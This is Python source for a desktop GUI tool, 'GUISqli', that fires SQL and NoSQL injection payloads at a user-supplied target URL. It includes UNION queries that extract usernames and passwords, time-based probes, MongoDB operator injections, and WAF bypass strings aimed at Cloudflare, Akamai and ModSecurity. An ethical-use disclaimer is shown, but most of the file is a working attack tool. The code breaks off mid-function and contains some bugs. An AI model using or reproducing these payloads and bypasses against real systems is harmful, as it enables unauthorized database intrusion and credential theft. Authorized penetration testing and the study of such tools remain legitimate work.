import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import requests
import time
import concurrent.futures
import sqlite3
import re
from urllib.parse import urlparse, parse_qs
import json
import threading
from flask import Flask, request, jsonify

class Tooltip:
    def __init__(self, widget, text):
        self.widget = widget
        self.text = text
        self.tooltip_window = None
        self.widget.bind("<Enter>", self.show_tooltip)
        self.widget.bind("<Leave>", self.hide_tooltip)

    def show_tooltip(self, event=None):
        x, y, _, _ = self.widget.bbox("insert")
        x += self.widget.winfo_rootx() + 25
        y += self.widget.winfo_rooty() + 25
        self.tooltip_window = tw = tk.Toplevel(self.widget)
        tw.wm_overrideredirect(True)
        tw.wm_geometry(f"+{x}+{y}")
        label = tk.Label(tw, text=self.text, background="yellow", relief="solid", borderwidth=1)
        label.pack()

    def hide_tooltip(self, event=None):
        if self.tooltip_window:
            self.tooltip_window.destroy()
            self.tooltip_window = None

class DBInjectionTester:
    def __init__(self, root):
        self.root = root
        self.root.title("Database Injection Vulnerability Tester")
        self.root.geometry("900x700")
        if not self.check_dependencies():
            return
        self.show_disclaimer()

    def check_dependencies(self):
        try:
            import requests
        except ImportError:
            messagebox.showerror("Dependency Missing", "The 'requests' package is required. Install it using 'pip install requests'.")
            self.root.destroy()
            return False
        try:
            from flask import Flask
        except ImportError:
            messagebox.showerror("Dependency Missing", "The 'flask' package is required for local testing. Install it using 'pip install flask'.")
            self.root.destroy()
            return False
        return True

    def validate_url(self, url):
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except ValueError:
            return False

    def show_disclaimer(self):
        dialog = tk.Toplevel(self.root)
        dialog.title("Ethical Usage Disclaimer")
        dialog.geometry("500x300")
        dialog.resizable(False, False)
        dialog.transient(self.root)
        dialog.grab_set()

        label = tk.Label(dialog, text="This tool is for educational and authorized testing only.\n\n"
                                     "Do not use it to test systems without explicit permission.\n\n"
                                     "By clicking 'I Agree', you confirm that you will use this tool responsibly.",
                         font=("Arial", 12), justify="center")
        label.pack(pady=20)

        agree_button = tk.Button(dialog, text="I Agree", command=lambda: [dialog.destroy(), self.initialize_ui()])
        agree_button.pack(pady=10)

        cancel_button = tk.Button(dialog, text="Cancel", command=self.root.destroy)
        cancel_button.pack(pady=5)

        dialog.update_idletasks()
        x = self.root.winfo_x() + (self.root.winfo_width() - dialog.winfo_width()) // 2
        y = self.root.winfo_y() + (self.root.winfo_height() - dialog.winfo_height()) // 2
        dialog.geometry(f"+{x}+{y}")

    def initialize_ui(self):
        # Create menu bar
        self.menu_bar = tk.Menu(self.root)
        self.root.config(menu=self.menu_bar)

        # Add File menu
        file_menu = tk.Menu(self.menu_bar, tearoff=0)
        self.menu_bar.add_cascade(label="File", menu=file_menu)
        file_menu.add_command(label="Save Config", command=self.save_config)
        file_menu.add_command(label="Load Config", command=self.load_config)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.root.destroy)

        # Add Help menu
        help_menu = tk.Menu(self.menu_bar, tearoff=0)
        self.menu_bar.add_cascade(label="Help", menu=help_menu)
        help_menu.add_command(label="About", command=self.show_about)

        # Create main notebook
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Create tabs
        self.setup_tab = ttk.Frame(self.notebook)
        self.sql_tab = ttk.Frame(self.notebook)
        self.nosql_tab = ttk.Frame(self.notebook)
        self.results_tab = ttk.Frame(self.notebook)
        self.firewall_bypass_tab = ttk.Frame(self.notebook)

        self.notebook.add(self.setup_tab, text="Setup")
        self.notebook.add(self.sql_tab, text="SQL Injection")
        self.notebook.add(self.nosql_tab, text="NoSQL Injection")
        self.notebook.add(self.firewall_bypass_tab, text="WAF Bypass")
        self.notebook.add(self.results_tab, text="Results & Reports")

        # Setup variables
        self.target_url = tk.StringVar()
        self.target_param = tk.StringVar()
        self.http_method = tk.StringVar(value="GET")
        self.cookies = tk.StringVar()
        self.headers = tk.StringVar()
        self.timeout = tk.IntVar(value=10)
        self.threads = tk.IntVar(value=5)
        self.request_delay = tk.DoubleVar(value=0.5)  # Delay between requests to avoid rate limiting

        # Initialize results storage
        self.results = []

        # Add status bar
        self.status_bar = tk.Label(self.root, text="Ready", bd=1, relief=tk.SUNKEN, anchor=tk.W)
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)

        # Build the UI
        self.build_setup_tab()
        self.build_sql_tab()
        self.build_nosql_tab()
        self.build_firewall_bypass_tab()
        self.build_results_tab()

        # Apply theme
        style = ttk.Style()
        style.theme_use('clam')

    def show_about(self):
        dialog = tk.Toplevel(self.root)
        dialog.title("About")
        dialog.geometry("400x200")
        dialog.resizable(False, False)
        dialog.transient(self.root)
        dialog.grab_set()

        about_info = "APP: GUISqli\n\nDEVELOPER: Ali Al-Kazaly aLiGeNiUs The Hackers\nVERSION: 1.0.0.0 (2025)"
        label = tk.Label(dialog, text=about_info, font=("Arial", 12), justify="center")
        label.pack(pady=20)

        tk.Button(dialog, text="OK", command=dialog.destroy).pack(pady=10)

        dialog.update_idletasks()
        x = self.root.winfo_x() + (self.root.winfo_width() - dialog.winfo_width()) // 2
        y = self.root.winfo_y() + (self.root.winfo_height() - dialog.winfo_height()) // 2
        dialog.geometry(f"+{x}+{y}")

    def save_config(self):
        config = {
            "target_url": self.target_url.get(),
            "target_param": self.target_param.get(),
            "http_method": self.http_method.get(),
            "cookies": self.cookies.get(),
            "headers": self.headers.get(),
            "timeout": self.timeout.get(),
            "threads": self.threads.get(),
            "request_delay": self.request_delay.get()
        }
        filename = tk.filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("JSON files", "*.json")])
        if filename:
            with open(filename, "w") as f:
                json.dump(config, f, indent=4)
            messagebox.showinfo("Success", "Configuration saved")

    def load_config(self):
        filename = tk.filedialog.askopenfilename(filetypes=[("JSON files", "*.json")])
        if filename:
            with open(filename, "r") as f:
                config = json.load(f)
            self.target_url.set(config.get("target_url", ""))
            self.target_param.set(config.get("target_param", ""))
            self.http_method.set(config.get("http_method", "GET"))
            self.cookies.set(config.get("cookies", ""))
            self.headers.set(config.get("headers", ""))
            self.timeout.set(config.get("timeout", 10))
            self.threads.set(config.get("threads", 5))
            self.request_delay.set(config.get("request_delay", 0.5))
            messagebox.showinfo("Success", "Configuration loaded")

    def build_setup_tab(self):
        frame = ttk.LabelFrame(self.setup_tab, text="Target Configuration")
        frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        ttk.Label(frame, text="Target URL:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        url_entry = ttk.Entry(frame, textvariable=self.target_url, width=70)
        url_entry.grid(row=0, column=1, padx=5, pady=5)
        Tooltip(url_entry, "Enter the target URL with a parameter placeholder (e.g., http://example.com/page.php?id=1)")

        ttk.Label(frame, text="Parameter to Test:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
        param_entry = ttk.Entry(frame, textvariable=self.target_param, width=70)
        param_entry.grid(row=1, column=1, padx=5, pady=5)
        Tooltip(param_entry, "Specify the parameter to test (e.g., id)")

        ttk.Label(frame, text="HTTP Method:").grid(row=2, column=0, sticky=tk.W, padx=5, pady=5)
        method_combo = ttk.Combobox(frame, textvariable=self.http_method, values=["GET", "POST"])
        method_combo.grid(row=2, column=1, sticky=tk.W, padx=5, pady=5)

        ttk.Label(frame, text="Cookies (name=value; ...):").grid(row=3, column=0, sticky=tk.W, padx=5, pady=5)
        cookies_entry = ttk.Entry(frame, textvariable=self.cookies, width=70)
        cookies_entry.grid(row=3, column=1, padx=5, pady=5)
        Tooltip(cookies_entry, "Enter cookies in the format name=value; name2=value2")

        ttk.Label(frame, text="Headers (JSON format):").grid(row=4, column=0, sticky=tk.W, padx=5, pady=5)
        headers_entry = ttk.Entry(frame, textvariable=self.headers, width=70)
        headers_entry.grid(row=4, column=1, padx=5, pady=5)
        Tooltip(headers_entry, "Enter headers in JSON format (e.g., {\"User-Agent\": \"Mozilla/5.0\"})")

        # Performance settings
        perf_frame = ttk.LabelFrame(self.setup_tab, text="Performance Settings")
        perf_frame.pack(fill=tk.X, padx=10, pady=10)

        ttk.Label(perf_frame, text="Request Timeout (seconds):").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        ttk.Spinbox(perf_frame, from_=1, to=60, textvariable=self.timeout, width=5).grid(row=0, column=1, sticky=tk.W, padx=5, pady=5)

        ttk.Label(perf_frame, text="Thread Count:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
        ttk.Spinbox(perf_frame, from_=1, to=20, textvariable=self.threads, width=5).grid(row=1, column=1, sticky=tk.W, padx=5, pady=5)

        ttk.Label(perf_frame, text="Request Delay (seconds):").grid(row=2, column=0, sticky=tk.W, padx=5, pady=5)
        ttk.Spinbox(perf_frame, from_=0, to=5, increment=0.1, textvariable=self.request_delay, width=5).grid(row=2, column=1, sticky=tk.W, padx=5, pady=5)

        # Buttons
        buttons_frame = ttk.Frame(self.setup_tab)
        buttons_frame.pack(fill=tk.X, pady=5)
        ttk.Button(buttons_frame, text="Save Config", command=self.save_config).pack(side=tk.LEFT, padx=5)
        ttk.Button(buttons_frame, text="Load Config", command=self.load_config).pack(side=tk.LEFT, padx=5)
        test_button = ttk.Button(buttons_frame, text="Test Connection", command=self.test_connection)
        test_button.pack(side=tk.LEFT, padx=5)

        # Explanation section
        exp_frame = ttk.LabelFrame(self.setup_tab, text="How to Use")
        exp_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        explanation = """
1. Enter the target URL with a parameter placeholder (e.g., http://example.com/page.php?id=1)
2. Specify which parameter to test (e.g., id)
3. Set HTTP method, cookies, and headers if needed
4. Adjust performance settings (timeout, threads, delay)
5. Test the connection to ensure the target is reachable
6. Navigate to the appropriate injection tab (SQL or NoSQL)
7. Select the testing method and run the test
8. Review results in the Results tab
        """
        exp_text = scrolledtext.ScrolledText(exp_frame, wrap=tk.WORD, height=10)
        exp_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        exp_text.insert(tk.END, explanation)
        exp_text.config(state=tk.DISABLED)

    def build_sql_tab(self):
        options_frame = ttk.LabelFrame(self.sql_tab, text="SQL Injection Options")
        options_frame.pack(fill=tk.X, padx=10, pady=10)

        self.sql_type = tk.StringVar(value="error")
        ttk.Label(options_frame, text="Injection Type:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        types = ttk.Combobox(options_frame, textvariable=self.sql_type, values=["error", "union", "boolean", "time"])
        types.grid(row=0, column=1, sticky=tk.W, padx=5, pady=5)

        self.dbms = tk.StringVar(value="mysql")
        ttk.Label(options_frame, text="Database Type:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
        dbms_combo = ttk.Combobox(options_frame, textvariable=self.dbms, values=["mysql", "mssql", "oracle", "postgresql", "sqlite"])
        dbms_combo.grid(row=1, column=1, sticky=tk.W, padx=5, pady=5)

        ttk.Label(options_frame, text="Custom Payload:").grid(row=2, column=0, sticky=tk.W, padx=5, pady=5)
        self.custom_sql_payload = tk.StringVar()
        ttk.Entry(options_frame, textvariable=self.custom_sql_payload, width=50).grid(row=2, column=1, padx=5, pady=5)

        buttons_frame = ttk.Frame(self.sql_tab)
        buttons_frame.pack(fill=tk.X, padx=10, pady=10)

        ttk.Button(buttons_frame, text="Run Standard Tests", command=self.run_sql_tests).pack(side=tk.LEFT, padx=5)
        ttk.Button(buttons_frame, text="Run Custom Payload", command=self.run_sql_custom).pack(side=tk.LEFT, padx=5)
        ttk.Button(buttons_frame, text="Load Payloads from File", command=lambda: self.load_payloads_from_file("sql")).pack(side=tk.LEFT, padx=5)

        payloads_frame = ttk.LabelFrame(self.sql_tab, text="Common SQL Injection Payloads")
        payloads_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        self.sql_payloads_text = scrolledtext.ScrolledText(payloads_frame, wrap=tk.WORD)
        self.sql_payloads_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        sql_payloads = """
# Error-based SQL Injection
'
' OR '1'='1
' OR 1=1 --
" OR 1=1 --
' OR '1'='1' --
') OR ('1'='1
1' OR '1' = '1
' UNION SELECT 1,2,3 --

# Time-based SQL Injection
'; WAITFOR DELAY '0:0:5' --
' OR (SELECT * FROM (SELECT(SLEEP(5)))a) --
' OR pg_sleep(5) --

# Boolean-based SQL Injection  
' AND 1=1 --
' AND 1=2 --

# UNION-based SQL Injection
' UNION SELECT username,password,3 FROM users --
' UNION SELECT table_name,2,3 FROM information_schema.tables --

# Different Database Syntaxes
# MySQL
' UNION SELECT @@version,2,3 --
# MSSQL
' UNION SELECT @@version,2,3 --
# Oracle
' UNION SELECT banner,NULL,NULL FROM v$version --
# PostgreSQL
' UNION SELECT version(),2,3 --
# SQLite
' UNION SELECT sqlite_version(),2,3 --
        """
        self.sql_payloads_text.insert(tk.END, sql_payloads)

    def build_nosql_tab(self):
        options_frame = ttk.LabelFrame(self.nosql_tab, text="NoSQL Injection Options")
        options_frame.pack(fill=tk.X, padx=10, pady=10)

        self.nosql_type = tk.StringVar(value="mongodb")
        ttk.Label(options_frame, text="NoSQL Type:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        types = ttk.Combobox(options_frame, textvariable=self.nosql_type, values=["mongodb", "redis", "couchdb"])
        types.grid(row=0, column=1, sticky=tk.W, padx=5, pady=5)

        ttk.Label(options_frame, text="Custom Payload:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
        self.custom_nosql_payload = tk.StringVar()
        ttk.Entry(options_frame, textvariable=self.custom_nosql_payload, width=50).grid(row=1, column=1, padx=5, pady=5)

        buttons_frame = ttk.Frame(self.nosql_tab)
        buttons_frame.pack(fill=tk.X, padx=10, pady=10)

        ttk.Button(buttons_frame, text="Run NoSQL Tests", command=self.run_nosql_tests).pack(side=tk.LEFT, padx=5)
        ttk.Button(buttons_frame, text="Run Custom Payload", command=self.run_nosql_custom).pack(side=tk.LEFT, padx=5)
        ttk.Button(buttons_frame, text="Load Payloads from File", command=lambda: self.load_payloads_from_file("nosql")).pack(side=tk.LEFT, padx=5)

        payloads_frame = ttk.LabelFrame(self.nosql_tab, text="Common NoSQL Injection Payloads")
        payloads_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        self.nosql_payloads_text = scrolledtext.ScrolledText(payloads_frame, wrap=tk.WORD)
        self.nosql_payloads_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        nosql_payloads = """
# MongoDB Injection
{"username": {"$ne": null}}
{"username": {"$in": ["admin", "user", "moderator"]}}
{"username": {"$regex": "admin"}}
{"$where": "sleep(5000)"}
{"$where": "this.password.match(/.*/)"}

# Parameter pollution
username[$ne]=null
username[$regex]=.*
username[$exists]=true

# JSON-based attacks
{"$where": "function() { return 1==1; }"}
{"username": {"$gt": ""}}
{"username": {"$nin": ["user1", "user2"]}}

# Advanced MongoDB
{"username": "admin", "$where": "this.password == 'password'"}
{"username": {"$exists": true}, "password": {"$exists": true}}
{"username": "admin", "_id": {"$ne": null}}
        """
        self.nosql_payloads_text.insert(tk.END, nosql_payloads)

    def build_firewall_bypass_tab(self):
        options_frame = ttk.LabelFrame(self.firewall_bypass_tab, text="WAF Bypass Techniques")
        options_frame.pack(fill=tk.X, padx=10, pady=10)

        self.waf_type = tk.StringVar(value="generic")
        ttk.Label(options_frame, text="WAF Type:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        types = ttk.Combobox(options_frame, textvariable=self.waf_type, values=["generic", "cloudflare", "akamai", "f5", "modsecurity"])
        types.grid(row=0, column=1, sticky=tk.W, padx=5, pady=5)

        ttk.Label(options_frame, text="Custom Bypass:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
        self.custom_waf_bypass = tk.StringVar()
        ttk.Entry(options_frame, textvariable=self.custom_waf_bypass, width=50).grid(row=1, column=1, padx=5, pady=5)

        buttons_frame = ttk.Frame(self.firewall_bypass_tab)
        buttons_frame.pack(fill=tk.X, padx=10, pady=10)

        ttk.Button(buttons_frame, text="Run Bypass Tests", command=self.run_bypass_tests).pack(side=tk.LEFT, padx=5)
        ttk.Button(buttons_frame, text="Test Custom Bypass", command=self.run_custom_bypass).pack(side=tk.LEFT, padx=5)
        ttk.Button(buttons_frame, text="Load Techniques from File", command=lambda: self.load_payloads_from_file("waf")).pack(side=tk.LEFT, padx=5)

        techniques_frame = ttk.LabelFrame(self.firewall_bypass_tab, text="WAF Bypass Techniques")
        techniques_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        self.waf_techniques_text = scrolledtext.ScrolledText(techniques_frame, wrap=tk.WORD)
        self.waf_techniques_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        waf_techniques = """
# Encoding Techniques
URL Encoding: %27%20OR%201=1%20--%20
Double URL Encoding: %2527%2520OR%25201=1%2520--%2520
Unicode Encoding: %u0027%u0020OR%u00201=1%u0020--%u0020
HTML Encoding: ' OR 1=1 --

# Obfuscation Techniques
Case Variation: Or, oR, OR
Comment Insertion: 'OR/**/1=1/**/--
Whitespace Manipulation: '  OR    1=1    --
Null Byte Injection: %00' OR 1=1 --

# Equivalent Expressions
Logical Equivalents: ' OR 2>1 --
Alternative Operators: ' || 1=1 --
Nested Queries: ' OR (SELECT 1)=1 --

# SQL Dialect Specific Bypasses
MySQL: /*!50000 SELECT */ 1
PostgreSQL: ' OR 1::int=1 --
MSSQL: '; EXEC('SEL' + 'ECT 1') --

# Special Characters
Backtick: `column`
Parentheses Variation: (')OR(1)=(1)--

# Time-delay Techniques (avoid WAF timeout)
Small Delays: '; WAITFOR DELAY '0:0:1' --
Incremental Testing: '; IF 1=1 WAITFOR DELAY '0:0:1' --

# HTTP Parameter Pollution
id=1&id=' OR '1'='1
        """
        self.waf_techniques_text.insert(tk.END, waf_techniques)

    def build_results_tab(self):
        self.results_text = scrolledtext.ScrolledText(self.results_tab, wrap=tk.WORD)
        self.results_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.results_text.tag_configure("vulnerable", foreground="red")
        self.results_text.tag_configure("possible", foreground="orange")

        buttons_frame = ttk.Frame(self.results_tab)
        buttons_frame.pack(fill=tk.X, padx=10, pady=5)

        ttk.Button(buttons_frame, text="Clear Results", command=self.clear_results).pack(side=tk.LEFT, padx=5)
        ttk.Button(buttons_frame, text="Save Results", command=self.save_results).pack(side=tk.LEFT, padx=5)

    def load_payloads_from_file(self, injection_type):
        filename = tk.filedialog.askopenfilename(filetypes=[("JSON files", "*.json")])
        if filename:
            try:
                with open(filename, "r") as f:
                    payloads = json.load(f)
                if not isinstance(payloads, list):
                    messagebox.showerror("Error", "Payload file must contain a JSON list of payloads")
                    return
                if injection_type == "sql":
                    self.sql_payloads_text.delete(1.0, tk.END)
                    self.sql_payloads_text.insert(tk.END, "\n".join(payloads))
                elif injection_type == "nosql":
                    self.nosql_payloads_text.delete(1.0, tk.END)
                    self.nosql_payloads_text.insert(tk.END, "\n".join(payloads))
                elif injection_type == "waf":
                    self.waf_techniques_text.delete(1.0, tk.END)
                    self.waf_techniques_text.insert(tk.END, "\n".join(payloads))
                messagebox.showinfo("Success", "Payloads loaded successfully")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to load payloads: {str(e)}")

    def test_connection(self):
        url = self.target_url.get()
        if not url:
            messagebox.showerror("Error", "Please enter a target URL")
            return
        if not self.validate_url(url):
            messagebox.showerror("Error", "Invalid URL format")
            return

        self.status_bar.config(text="Testing connection...")
        try:
            headers = {}
            if self.headers.get():
                try:
                    headers = json.loads(self.headers.get())
                except json.JSONDecodeError:
                    messagebox.showerror("Error", "Invalid JSON format for headers")
                    return

            cookies = {}
            if self.cookies.get():
                cookie_pairs = self.cookies.get().split(';')
                for pair in cookie_pairs:
                    if '=' in pair:
                        key, value = pair.strip().split('=', 1)
                        cookies[key] = value

            response = requests.get(url, headers=headers, cookies=cookies, timeout=self.timeout.get())

            if response.status_code < 400:
                messagebox.showinfo("Success", f"Connection successful! Status code: {response.status_code}")
                self.add_result(f"Connection test successful for {url}\nStatus code: {response.status_code}")
            else:
                messagebox.warning("Warning", f"Connection received error response: {response.status_code}")
                self.add_result(f"Connection test warning for {url}\nStatus code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            messagebox.showerror("Error", f"Connection failed: {str(e)}")
            self.add_result(f"Connection test failed for {url}\nError: {str(e)}")
        finally:
            self.status_bar.config(text="Ready")

    def get_request_data(self):
        url = self.target_url.get()
        param = self.target_param.get()
        method = self.http_method.get()

        if not url or not param:
            messagebox.showerror("Error", "Target URL and parameter are required")
            return None
        if not self.validate_url(url):
            messagebox.showerror("Error", "Invalid URL format")
            return None

        headers = {}
        if self.headers.get():
            try:
                headers = json.loads(self.headers.get())
            except json.JSONDecodeError:
                messagebox.showerror("Error", "Invalid JSON format for headers")
                return None

        cookies = {}
        if self.cookies.get():
            cookie_pairs = self.cookies.get().split(';')
            for pair in cookie_pairs:
                if '=' in pair:
                    key, value = pair.strip().split('=', 1)
                    cookies[key] = value

        return {
            'url': url,
            'param': param,
            'method': method,
            'headers': headers,
            'cookies': cookies,
            'timeout': self.timeout.get(),
            'delay': self.request_delay.get()
        }

    def run_sql_tests(self):
        request_data = self.get_request_data()
        if not request_data:
            return

        injection_type = self.sql_type.get()
        dbms = self.dbms.get()

        payloads = []
        if injection_type == "error":
            payloads = ["'", "\"", "1' OR '1'='1", "1\" OR \"1\"=\"1", "' OR 1=1 --", "\" OR 1=1 --"]
        elif injection_type == "union":
            if dbms == "mysql":
                payloads = ["' UNION SELECT 1,2,3 --", "' UNION SELECT 1,2,3,4 --"]
            elif dbms == "mssql":
                payloads = ["' UNION SELECT 1,2,3 --", "' UNION ALL SELECT 1,2,3 --"]
            else:
                payloads = ["' UNION SELECT 1,2,3 --", "' UNION SELECT NULL,NULL,NULL --"]
        elif injection_type == "boolean":
            payloads = ["' AND 1=1 --", "' AND 1=2 --", "' OR 1=1 --", "' OR 1=2 --"]
        elif injection_type == "time":
            if dbms == "mysql":
                payloads = ["' OR (SELECT * FROM (SELECT(SLEEP(2)))a) --", "' OR SLEEP(2) --"]
            elif dbms == "mssql":
                payloads = ["'; WAITFOR DELAY '0:0:2' --", "'); WAITFOR DELAY '0:0:2' --"]
            elif dbms == "postgresql":
                payloads = ["'; SELECT pg_sleep(2) --", "' OR pg_sleep(2) --"]
            else:
                payloads = ["'; SELECT sleep(2) --", "' OR sleep(2) --"]

        self.add_result(f"Starting SQL injection tests ({injection_type}) for {dbms}")
        self.run_payloads(request_data, payloads)

    def run_sql_custom(self):
        request_data = self.get_request_data()
        if not request_data:
            return

        payload = self.custom_sql_payload.get()
        if not payload:
            messagebox.showerror("Error", "Please enter a custom SQL injection payload")
            return

        self.add_result(f"Testing custom SQL payload: {payload}")
        self.run_payloads(request_data, [payload])

    def run_nosql_tests(self):
        request_data = self.get_request_data()
        if not request_data:
            return

        nosql_type = self.nosql_type.get()

        payloads = []
        if nosql_type == "mongodb":
            payloads = [
                '{"username": {"$ne": null}}',
                '{"username": {"$gt": ""}}',
                '{"$where": "this.password.match(/.*/)"',  # Removed trailing comma
                'username[$ne]=null',
                'username[$exists]=true'
            ]
        elif nosql_type == "redis":
            payloads = [
                'KEYS *',
                'INFO',
                'CONFIG GET *'
            ]
        elif nosql_type == "couchdb":
            payloads = [
                '/_all_dbs',
                '/_utils/',
                '/_config/'
            ]

        self.add_result(f"Starting NoSQL injection tests for {nosql_type}")
        self.run_payloads(request_data, payloads)

    def run_nosql_custom(self):
        request_data = self.get_request_data()
        if not request_data:
            return

        payload = self.custom_nosql_payload.get()
        if not payload:
            messagebox.showerror("Error", "Please enter a custom NoSQL injection payload")
            return

        self.add_result(f"Testing custom NoSQL payload: {payload}")
        self.run_payloads(request_data, [payload])

    def run_bypass_tests(self):
        request_data = self.get_request_data()
        if not request_data:
            return

        waf_type = self.waf_type.get()

        payloads = []
        if waf_type == "generic":
            payloads = [
                '%27%20OR%201=1%20--%20',
                "' OR 1=1 --",  # Fixed: Removed trailing comma
                "' OR/**/ 1=1 /**/ --",
                "' OR\t1=1\t--",
                "'/**/OR/**/1=1/**/--"
            ]
        elif waf_type == "cloudflare":
            payloads = [
                "')+OR+1=1--",
                "'%0bOR%0b1=1--",
                "'%0d%0aOR%0d%0a1=1--",
                "'/*!50000*/OR/**/1=1--"
            ]
        elif waf_type == "akamai":
            payloads = [
                "'%23%0aOR%23%0a1=1--",
                "'%2b%0aOR%2b%0a1=1--",
                "'/**/union/**/select/**/"
            ]
        elif waf_type == "modsecurity":
            payloads = [
                "' /*!50000*/OR 1=1--",
                "'+CASE+WHEN+(1=1)+THEN+1+ELSE+0+END--",
                "'%0dOR%0d1=1--"
            ]

        self.add_result(f"Starting WAF bypass tests for {waf_type}")
        self.run_payloads(request_data, payloads)

    def run_custom_bypass(self):
        request_data = self.get_request_data()
        if not request_data:
            return

        payload = self.custom_waf_bypass.get()
        if not payload:
            messagebox.showerror("Error", "Please enter a custom WAF bypass payload")
            return

        self.add_result(f"Testing custom WAF bypass: {payload}")
        self.run_payloads(request_data, [payload])

    def run_payloads(self, request_data, payloads):
        if not payloads:
            messagebox.showinfo("Info", "No payloads to test")
            return

        self.running = True
        self.paused = False

        url = request_data['url']
        param = request_data['param']
        method = request_data['method']
        headers = request_data['headers']
        cookies = request_data['cookies']
        timeout = request_data['timeout']
        delay = request_data['delay']

        if '{' + param + '}' in url:
            base_url = url
        else:
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)

            if param in query_params:
                new_params = []
                for key, value in query_params.items():
                    if key == param:
                        new_params.append(f"{key}={{{param}}}")
                    else:
                        new_params.append(f"{key}={value[0]}")
                query_string = "&".join(new_params)
                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query_string}"
            else:
                if parsed_url.query:
                    base_url = f"{url}&{param}={{{param}}}"
                else:
                    base_url = f"{url}?{param}={{{param}}}"

        progress = tk.IntVar()
        progress_window = tk.Toplevel(self.root)
        progress_window.title("Testing Progress")
        progress_window.geometry("400x150")

        ttk.Label(progress_window, text="Running injection tests...").pack(pady=10)
        self.current_payload_label = ttk.Label(progress_window, text="Current Payload: None")
        self.current_payload_label.pack(pady=5)
        progress_bar = ttk.Progressbar(progress_window, variable=progress, maximum=len(payloads))
        progress_bar.pack(fill=tk.X, padx=20, pady=10)

        button_frame = ttk.Frame(progress_window)
        button_frame.pack(pady=5)
        pause_button = ttk.Button(button_frame, text="Pause", command=self.toggle_pause)
        pause_button.pack(side=tk.LEFT, padx=5)
        cancel_button = ttk.Button(button_frame, text="Cancel", command=self.cancel_tests)
        cancel_button.pack(side=tk.LEFT, padx=5)

        self.status_bar.config(text="Testing...")
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads.get()) as executor:
            future_to_payload = {
                executor.submit(
                    self.test_payload,
                    base_url,
                    param,
                    payload,
                    method,
                    headers,
                    cookies,
                    timeout,
                    delay
                ): payload for payload in payloads
            }

            for i, future in enumerate(concurrent.futures.as_completed(future_to_payload)):
                if not self.running:
                    break
                payload = future_to_payload[future]
                self.current_payload_label.config(text=f"Current Payload: {payload}")
                while self.paused and self.running:
                    self.root.update()
                    time.sleep(0.1)
                progress.set(i + 1)
                progress_window.update()

                try:
                    result = future.result()
                    self.add_result(result)
                except Exception as e:
                    self.add_result(f"Error testing payload '{payload}': {str(e)}")

        progress_window.destroy()
        if self.running:
            messagebox.showinfo("Complete", f"Completed testing {len(payloads)} payloads")
        self.status_bar.config(text="Ready")

    def toggle_pause(self):
        self.paused = not self.paused
        self.status_bar.config(text="Paused" if self.paused else "Testing...")

    def cancel_tests(self):
        self.running = False
        self.status_bar.config(text="Test Cancelled")

    def test_payload(self, base_url, param, payload, method, headers, cookies, timeout, delay):
        try:
            test_url = base_url.replace('{' + param + '}', payload)
            start_time = time.time()

            if method.upper() == 'GET':
                response = requests.get(
                    test_url,
                    headers=headers,
                    cookies=cookies,
                    timeout=timeout,
                    allow_redirects=False
                )
            else:
                parsed_url = urlparse(test_url)
                params = {}
                if parsed_url.query:
                    for key, value in parse_qs(parsed_url.query).items():
                        params[key] = value[0]
                base_post_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                response = requests.post(
                    base_post_url,
                    data=params,
                    headers=headers,
                    cookies=cookies,
                    timeout=timeout,
                    allow_redirects=False
                )

            response_time = time.time() - start_time
            injection_detected = self.analyze_response(response, payload, response_time)

            if injection_detected:
                result = f"[VULNERABLE] Payload: {payload}\n"
                result += f"Status: {response.status_code}, Size: {len(response.text)}, Time: {response_time:.2f}s\n"
                result += f"Detected: {injection_detected}\n"
                result += "-" * 60
            else:
                result = f"[TESTED] Payload: {payload}\n"
                result += f"Status: {response.status_code}, Size: {len(response.text)}, Time: {response_time:.2f}s\n"
                result += "-" * 60

            # Add delay to avoid rate limiting
            time.sleep(delay)

            return result

        except requests.exceptions.Timeout:
            if "SLEEP" in payload.upper() or "DELAY" in payload.upper() or "pg_sleep" in payload:
                return f"[POSSIBLE VULNERABLE - TIMEOUT] Payload: {payload}\n" + "-" * 60
            else:
                return f"[TIMEOUT] Payload: {payload}\n" + "-" * 60

        except requests.exceptions.RequestException as e:
            return f"[ERROR] Payload: {payload}, Error: {str(e)}\n" + "-" * 60

    def analyze_response(self, response, payload, response_time):
        error_patterns = [
            r"SQL syntax.*?error",
            r"Warning.*?mysql_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"ORA-[0-9]+",
            r"Oracle error",
            r"Microsoft SQL Server error",
            r"ODBC SQL Server error",
            r"SQLServer JDBC Driver",
            r"PostgreSQL.*?ERROR",
            r"ERROR:.*?syntax error",
            r"unterminated quoted string",
            r"unexpected token",
            r"CastError"
        ]

        for pattern in error_patterns:
